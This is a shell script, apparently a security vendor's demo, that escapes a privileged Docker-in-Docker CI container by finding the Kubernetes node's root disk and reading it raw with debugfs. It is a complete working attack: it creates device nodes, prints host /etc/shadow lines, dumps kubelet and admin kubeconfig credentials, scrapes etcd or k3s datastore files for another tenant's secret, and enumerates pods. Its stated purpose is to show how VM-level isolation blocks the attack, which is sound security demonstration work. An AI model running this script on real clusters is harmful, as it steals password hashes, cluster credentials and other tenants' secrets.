#!/bin/sh
# 
# escape-demo.sh — Container escape demonstration
#
# Run in the privileged dind container. 
#
# Technique: privileged containers can see the host's block devices in
# /proc/partitions and address them in /dev. The host's root partition is
# already mounted by the host kernel (so a fresh mount returns EBUSY), but
# we don't need to mount it — debugfs reads files directly from the ext4
# structures on the raw device, read-only, no mount required.
#
# On the Edera runtime, the host's disk is not present in /proc/partitions
# at all — there is nothing to open, so every test reports CONTAINED.
# 

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

divider() {
  printf "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n\n"
}

passed=0
failed=0

printf "${BOLD}╔══════════════════════════════════════════════════════════╗${NC}\n"
printf "${BOLD}║         CONTAINER ESCAPE DEMONSTRATION                  ║${NC}\n"
printf "${BOLD}║         Running as: Tenant A CI Runner (dind)           ║${NC}\n"
printf "${BOLD}║         Only requires: privileged: true                 ║${NC}\n"
printf "${BOLD}╚══════════════════════════════════════════════════════════╝${NC}\n"

# ── Setup: locate the host root device and confirm we can read it ──────────

divider
printf "${YELLOW}SETUP: Locating the host's root block device${NC}\n\n"

printf "  /proc/partitions:\n"
awk 'NR>2 {printf "    %-12s (%s blocks)\n", $4, $3}' /proc/partitions
printf "\n"

# ensure debugfs
if ! command -v debugfs >/dev/null 2>&1; then
  printf "  Installing e2fsprogs (for debugfs)...\n"
  apk add --no-cache e2fsprogs >/dev/null 2>&1 || true
fi

# dbg <device> <request>
dbg() {
  _out=$(debugfs -R "$2" "$1" 2>/dev/null)
  case "$_out" in
    *"File not found"*|*"contains a "*" file system"*|*"Bad magic number"*|*"while opening"*|*"while reading"*)
      return 1 ;;
  esac
  printf '%s' "$_out"
}

fs_is_ext() {
  debugfs -R "show_super_stats -h" "$1" 2>/dev/null | grep -qiE 'Inode count|Block count'
}

host_read() { [ -n "$HOST_DEV" ] || return 1; dbg "$HOST_DEV" "cat $1"; }
host_ls()   { [ -n "$HOST_DEV" ] || return 1; dbg "$HOST_DEV" "ls -l $1"; }

# Find the host root partition by iterating real-disk partitions (skip loop
# devices), create the device node if the minimal DinD /dev lacks it, and
# test each one by trying to read /etc/hostname via debugfs.
HOST_DEV=""
CAND_FILE=$(mktemp)
awk 'NR>2 && $4 !~ /^loop/ && $4 ~ /[0-9]$/ {print $1, $2, $4}' /proc/partitions  > "$CAND_FILE"
awk 'NR>2 && $4 !~ /^loop/ && $4 !~ /[0-9]$/ {print $1, $2, $4}' /proc/partitions >> "$CAND_FILE"

while read -r major minor name; do
  [ -z "$name" ] && continue
  dev="/dev/$name"
  [ -b "$dev" ] || mknod "$dev" b "$major" "$minor" 2>/dev/null || continue

  # Skip anything debugfs can't open as ext (squashfs, raw, empty). This is
  # what rules out the microVM's own rootfs and keeps Edera fully contained.
  fs_is_ext "$dev" || continue

  # An ext4 root will have /etc/hostname readable via debugfs.
  probe=$(dbg "$dev" "cat /etc/hostname")
  if [ -n "$probe" ]; then
    # Confirm it's the node root (has kubelet or kubernetes dirs), not /boot.
    if dbg "$dev" "ls -l /var/lib/kubelet" >/dev/null || \
       dbg "$dev" "ls -l /etc/kubernetes" >/dev/null; then
      HOST_DEV="$dev"
      break
    fi
  fi
done < "$CAND_FILE"
rm -f "$CAND_FILE"

if [ -z "$HOST_DEV" ]; then
  printf "  ${GREEN}No host root filesystem is reachable from this container.${NC}\n"
  printf "  ${GREEN}  The node's disk is not present in /proc/partitions —${NC}\n"
  printf "  ${GREEN}  consistent with VM-level isolation.${NC}\n"
  divider
  printf "${BOLD}SUMMARY: 6 contained, 0 escaped${NC}\n\n"
  printf "${GREEN}All escape attempts were blocked.${NC}\n"
  printf "${GREEN}The host's block devices are not visible from inside this${NC}\n"
  printf "${GREEN}pod, so there is nothing to read. The CI build still ran${NC}\n"
  printf "${GREEN}and Docker still works — the workload is unaffected.${NC}\n\n"
  exit 0
fi

printf "  ${RED}Host root device found: ${HOST_DEV}${NC}\n"
printf "  ${RED}Reading it directly with debugfs (no mount needed — the host's${NC}\n"
printf "  ${RED}live root returns EBUSY on mount, but raw reads still work).${NC}\n"

divider
printf "${YELLOW}TEST 1: What host are we really on?${NC}\n"
printf "Container hostname: $(hostname)\n\n"

HOST_HOSTNAME=$(host_read /etc/hostname | head -1)

if [ -n "$HOST_HOSTNAME" ] && [ "$HOST_HOSTNAME" != "$(hostname)" ]; then
  printf "  ${RED}ESCAPED — node hostname: ${BOLD}${HOST_HOSTNAME}${NC}\n"
  printf "  ${RED}  (container thinks it's: $(hostname))${NC}\n"
  HOST_OS=$(host_read /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)
  [ -n "$HOST_OS" ] && printf "  ${RED}  Host OS: ${HOST_OS}${NC}\n"
  failed=$((failed + 1))
else
  printf "  ${GREEN}CONTAINED — could not read a host hostname${NC}\n"
  passed=$((passed + 1))
fi

divider
printf "${YELLOW}TEST 2: Can we read the host's /etc/shadow?${NC}\n\n"

SHADOW=$(host_read /etc/shadow | head -3)

if [ -n "$SHADOW" ]; then
  printf "  ${RED}ESCAPED — host /etc/shadow contents:${NC}\n"
  echo "$SHADOW" | while IFS= read -r line; do printf "    ${RED}%s${NC}\n" "$line"; done
  printf "    ${RED}... (truncated)${NC}\n"
  failed=$((failed + 1))
else
  printf "  ${GREEN}CONTAINED — cannot read /etc/shadow${NC}\n"
  passed=$((passed + 1))
fi

divider
printf "${YELLOW}TEST 3: Can we access kubelet credentials?${NC}\n\n"

KUBE_CREDS=""
KUBE_PATH=""
for path in \
  /etc/kubernetes/kubelet.conf \
  /var/lib/kubelet/kubeconfig \
  /etc/kubernetes/admin.conf \
  ; do
  CONTENT=$(host_read "$path" | head -8)
  if [ -n "$CONTENT" ]; then
    KUBE_CREDS="$CONTENT"
    KUBE_PATH="$path"
    break
  fi
done

if [ -n "$KUBE_CREDS" ]; then
  printf "  ${RED}ESCAPED — found kubelet credentials at:${NC}\n"
  printf "    ${RED}${KUBE_PATH}${NC}\n\n"
  echo "$KUBE_CREDS" | while IFS= read -r line; do printf "    ${RED}%s${NC}\n" "$line"; done
  printf "\n  ${RED}  With these credentials, an attacker can talk to the${NC}\n"
  printf "  ${RED}  Kubernetes API as the kubelet.${NC}\n"
  failed=$((failed + 1))
else
  printf "  ${GREEN}CONTAINED — no kubelet credentials found${NC}\n"
  passed=$((passed + 1))
fi

divider
printf "${YELLOW}TEST 4: Can we read other tenants' secrets from the datastore on disk?${NC}\n\n"

# Tenant B's planted marker (see manifests/02-tenant-b-victim.yaml)
SECRET_MARKER="super-secret-password-do-not-share"

# Candidate datastore paths: etcd (kubeadm/kind/minikube/rke2) and k3s/kine.
DB_CANDIDATES="
/var/lib/etcd/member/snap/db
/var/lib/rancher/k3s/server/db/etcd/member/snap/db
/var/lib/rancher/k3s/server/db/state.db
/var/lib/rancher/rke2/server/db/etcd/member/snap/db
/var/lib/minikube/etcd/member/snap/db
"

TENANT_B_SECRET=""
TENANT_B_PATH=""
for db in $DB_CANDIDATES; do
  # debugfs cat dumps the raw datastore. Strip NULs so grep treats it as text,
  # then pull the plaintext secret out of the serialized object bytes.
  hit=$(host_read "$db" 2>/dev/null | tr -d '\000' | grep -o "$SECRET_MARKER" | head -n1)
  if [ -n "$hit" ]; then
    TENANT_B_SECRET="$hit"
    TENANT_B_PATH="$db"
    break
  fi
done

if [ -n "$TENANT_B_SECRET" ]; then
  printf "  ${RED}ESCAPED — recovered Tenant B's secret from the datastore on disk:${NC}\n"
  printf "    ${RED}source: ${TENANT_B_PATH} (secrets are unencrypted at rest)${NC}\n"
  printf "    ${RED}value:  ${TENANT_B_SECRET}${NC}\n"
  printf "\n  ${RED}  ⚠ Tenant B's database password, read from Tenant A's CI pod.${NC}\n"
  failed=$((failed + 1))
else
  printf "  ${GREEN}CONTAINED — no tenant secrets reachable in the datastore${NC}\n"
  printf "  ${GREEN}  (datastore not on this node's root fs, or encrypted at rest)${NC}\n"
  passed=$((passed + 1))
fi

divider
printf "${YELLOW}TEST 5: Can we read the host's machine identity?${NC}\n\n"

MACHINE_ID=$(host_read /etc/machine-id | head -1)

if [ -n "$MACHINE_ID" ]; then
  printf "  ${RED}ESCAPED — host /etc/machine-id:${NC}\n"
  printf "    ${RED}${MACHINE_ID}${NC}\n"
  printf "  ${RED}  Uniquely identifies the node; usable to impersonate it.${NC}\n"
  failed=$((failed + 1))
else
  printf "  ${GREEN}CONTAINED — cannot read host machine-id${NC}\n"
  passed=$((passed + 1))
fi

divider
printf "${YELLOW}TEST 6: Can we enumerate other workloads on the node?${NC}\n\n"

POD_LIST=$(host_ls /var/lib/kubelet/pods 2>/dev/null | awk '{print $NF}' | grep -E '^[0-9a-f-]{36}$')
POD_N=$(printf "%s\n" "$POD_LIST" | grep -c . )

if [ -n "$POD_LIST" ] && [ "$POD_N" -gt 0 ]; then
  printf "  ${RED}ESCAPED — found ${POD_N} pod state directories on the host:${NC}\n"
  printf "%s\n" "$POD_LIST" | head -5 | while IFS= read -r uid; do
    printf "    ${RED}%s${NC}\n" "$uid"
  done
  [ "$POD_N" -gt 5 ] && printf "    ${RED}... and $((POD_N - 5)) more${NC}\n"
  printf "  ${RED}  Every workload's on-disk state is readable from here.${NC}\n"
  failed=$((failed + 1))
else
  printf "  ${GREEN}CONTAINED — cannot enumerate host workloads${NC}\n"
  passed=$((passed + 1))
fi

divider
printf "${BOLD}SUMMARY: ${passed} contained, ${failed} escaped${NC}\n\n"

if [ "$failed" -eq 0 ]; then
  printf "${GREEN}All escape attempts were blocked.${NC}\n"
  printf "${GREEN}The host filesystem was not reachable from this container.${NC}\n\n"
  printf "${GREEN}The build still passed.${NC}\n"
else
  printf "${BOLD}${failed}/6 escape attempts SUCCEEDED using only privileged: true.${NC}\n"
  printf "${BOLD}From this CI pod, reading the host disk directly via debugfs:${NC}\n"
  [ -n "$HOST_HOSTNAME" ] && [ "$HOST_HOSTNAME" != "$(hostname)" ] && printf "${BOLD}  • Identified the host node: ${HOST_HOSTNAME}${NC}\n"
  [ -n "$SHADOW" ] && printf "${BOLD}  • Read the host's password hashes (/etc/shadow)${NC}\n"
  [ -n "$KUBE_CREDS" ] && printf "${BOLD}  • Read kubelet credentials (cluster API access)${NC}\n"
  [ -n "$TENANT_B_SECRET" ] && printf "${BOLD}  • Read Tenant B's database password${NC}\n"
  [ -n "$MACHINE_ID" ] && printf "${BOLD}  • Read the host machine-id${NC}\n"
  [ -n "$POD_LIST" ] && printf "${BOLD}  • Enumerated every other workload on the node${NC}\n"
  printf "\n${BOLD}No exploits or hostPID access, just privileged: true, which${NC}\n"
  printf "${BOLD}Docker-in-Docker requires to function. The host's root disk is${NC}\n"
  printf "${BOLD}busy and can't be mounted in the privilged container, but${NC}\n"
  printf "${BOLD}raw block reads bypass that entirely.${NC}\n"
fi
printf "\n"
